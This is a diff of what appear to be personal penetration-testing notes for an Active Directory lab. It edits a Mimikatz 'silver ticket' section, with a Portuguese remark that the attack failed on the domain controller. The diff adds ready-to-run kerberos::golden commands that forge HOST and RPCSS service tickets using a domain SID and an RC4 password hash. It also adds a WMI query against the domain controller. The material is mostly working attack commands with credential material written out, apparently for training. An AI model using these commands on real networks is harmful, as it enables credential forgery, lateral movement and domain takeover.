@@ -2796,7 +2796,11 @@ kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-321
 ```
 schtasks /S DCORP-DC
 ```
-##### MIMIKATZ - SILVER TICKET WMI
+##### MIMIKATZ - SILVER TICKET WMI (NAO FUNCIONOU NO DC, TESTAR NA AWS)
 ```
-kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:DCORP-DC /service:host /rc4:c8c8cb22026d2c89afe3b2280707e055 /user:administrator /ptt
+kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:731a06658bc10b59d71f5176e93e5710 /user:Administrator /ptt
+kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:RPCSS /rc4:731a06658bc10b59d71f5176e93e5710 /user:Administrator /ptt
+```
+```
+Get-WmiObject -Class win32_operatingsystem -ComputerName dcorp-dc.dollarcorp.moneycorp.local
 ```
